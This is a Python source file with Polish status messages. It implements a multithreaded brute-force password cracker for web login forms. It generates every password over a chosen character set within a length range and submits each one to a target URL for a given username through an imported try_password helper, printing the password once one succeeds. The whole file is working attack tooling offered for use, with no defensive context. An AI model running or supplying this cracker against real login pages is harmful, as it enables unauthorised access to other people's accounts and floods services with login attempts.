import itertools
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
from src.target import try_password

def get_charset(charset_name: str):
    mapping = {
        'ascii_uppercase': string.ascii_uppercase,
        'ascii_lowercase': string.ascii_lowercase,
        'digits': string.digits,
        'ascii_letters': string.ascii_letters,
        'ascii_uppercase+digits': string.ascii_uppercase + string.digits,
        'ascii_lowercase+digits': string.ascii_lowercase + string.digits,
        'all': string.ascii_letters + string.digits + string.punctuation
    }
    return mapping.get(charset_name, charset_name)

def brute_force(url, username, charset, min_length, max_length, threads, success_string, fail_string,
                login_field, password_field, submit_field, extra_fields, method):
    chars = get_charset(charset)
    print(f"Brute-force na {url} jako {username}, login_field={login_field}, password_field={password_field}, submit_field={submit_field}, min_len={min_length}, max_len={max_length}")

    def password_generator():
        for l in range(min_length, max_length+1):
            for pw_tuple in itertools.product(chars, repeat=l):
                yield ''.join(pw_tuple)

    total = sum(len(chars)**l for l in range(min_length, max_length+1))
    generator = password_generator()

    found = False
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {}
        with tqdm(total=total, desc="Testowane hasła") as pbar:
            while not found:
                batch = list(itertools.islice(generator, threads*10))
                if not batch:
                    break
                for pw in batch:
                    future = executor.submit(
                        try_password, url, username, pw, success_string, fail_string,
                        login_field, password_field, submit_field, extra_fields, method
                    )
                    futures[future] = pw
                for future in as_completed(futures):
                    pw = futures[future]
                    try:
                        result = future.result()
                        pbar.update(1)
                        if result:
                            print(f"\nZnalezione hasło: {pw}")
                            found = True
                            return
                    except Exception as e:
                        pbar.write(f"Błąd przy haśle {pw}: {e}")
                futures.clear()
    print("Nie znaleziono hasła w podanym zakresie.")
